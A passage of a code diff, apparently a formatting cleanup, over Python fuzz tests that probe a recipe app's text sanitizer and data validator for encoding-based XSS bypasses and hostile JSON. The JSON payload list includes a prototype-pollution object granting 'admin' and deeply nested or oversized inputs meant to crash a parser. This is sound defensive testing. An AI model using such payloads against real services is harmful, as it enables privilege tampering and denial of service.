+        "koi8-u",
     ]
 
     def test_encoding_round_trips(self):
@@ -1077,8 +1220,8 @@ class TestKitchenSinkEncoding:
         for s in test_strings:
             for enc in self.ENCODINGS:
                 try:
-                    encoded = s.encode(enc, errors='replace')
-                    decoded = encoded.decode(enc, errors='replace')
+                    encoded = s.encode(enc, errors="replace")
+                    decoded = encoded.decode(enc, errors="replace")
                     result = sanitize_text(decoded)
                     if "<script" in result.lower():
                         log_vulnerability("ENCODING_BYPASS", f"XSS via {enc}", s, None)
@@ -1107,7 +1250,7 @@ class TestKitchenSinkEncoding:
         """Fuzz all encodings with random binary data."""
         for enc in self.ENCODINGS:
             try:
-                decoded = data.decode(enc, errors='replace')
+                decoded = data.decode(enc, errors="replace")
                 result = sanitize_text(decoded, max_length=10000)
                 assert isinstance(result, str)
             except (UnicodeError, ValidationError):
@@ -1120,6 +1263,7 @@ class TestKitchenSinkEncoding:
 # SERIALIZATION ATTACKS - KITCHEN SINK
 # =============================================================================
 
+
 class TestKitchenSinkSerialization:
     """Test serialization-based attacks."""
 
@@ -1129,27 +1273,34 @@ class TestKitchenSinkSerialization:
             '{"__proto__": {"admin": true}}',
             '{"constructor": {"prototype": {}}}',
             '{"a": 1e999}',
-            '{"a": ' + '1' * 10000 + '}',
-            '{"a": "' + 'x' * 100000 + '"}',
-            '["' + 'a' * 10000 + '"]',
-            '[' * 1000 + '1' + ']' * 1000,
-            '{"a": {"b": {"c": ' * 100 + '1' + '}}}' * 100,
+            '{"a": ' + "1" * 10000 + "}",
+            '{"a": "' + "x" * 100000 + '"}',
+            '["' + "a" * 10000 + '"]',
+            "[" * 1000 + "1" + "]" * 1000,
+            '{"a": {"b": {"c": ' * 100 + "1" + "}}}" * 100,
         ]
         for payload in json_payloads:
             try:
                 data = json.loads(payload)
                 if isinstance(data, dict):
-                    result = validate_recipe_data(data)
+                    validate_recipe_data(data)
             except (json.JSONDecodeError, ValidationError, RecursionError):
                 pass
             except Exception as e:
                 log_vulnerability("JSON", "Crash on JSON", payload[:50], e)
 
-    @given(st.recursive(
-        st.none() | st.booleans() | st.integers() | st.floats(allow_nan=False) | st.text(max_size=100),
-        lambda children: st.lists(children, max_size=20) | st.dictionaries(st.text(max_size=20), children, max_size=10),
-        max_leaves=1000
-    ))
+    @given(
+        st.recursive(
+            st.none()
+            | st.booleans()
+            | st.integers()
+            | st.floats(allow_nan=False)
+            | st.text(max_size=100),
+            lambda children: st.lists(children, max_size=20)
+            | st.dictionaries(st.text(max_size=20), children, max_size=10),
+            max_leaves=1000,
+        )
+    )
     @HEAVY_SETTINGS
     def test_json_round_trip(self, data):
         """Test JSON round-trip with arbitrary data."""
@@ -1157,7 +1308,7 @@ class TestKitchenSinkSerialization:
             json_str = json.dumps(data)
             parsed = json.loads(json_str)
             if isinstance(parsed, dict):
-                result = validate_recipe_data(parsed)
+                validate_recipe_data(parsed)
         except (TypeError, ValueError, ValidationError, RecursionError):
             pass
         except Exception as e:
@@ -1169,6 +1320,7 @@ class TestKitchenSinkSerialization:
 # SUMMARY TEST - RUN EVERYTHING
 # =============================================================================
 
+
 class TestKitchenSinkSummary:
     """Summary test that runs through all payload categories."""
 
@@ -1179,10 +1331,10 @@ class TestKitchenSinkSummary:
                 content = f.read()
             vuln_count = content.count("VULNERABILITY FOUND")
             if vuln_count > 0:
-                print(f"\n\n{'='*80}")
+                print(f"\n\n{'=' * 80}")
                 print(f"VULNERABILITIES FOUND: {vuln_count}")
                 print(f"See: {VULN_LOG}")
-                print(f"{'='*80}\n")
+                print(f"{'=' * 80}\n")
                 print(content[-5000:])  # Print last 5000 chars
             else:
                 print("\nNo vulnerabilities logged.")
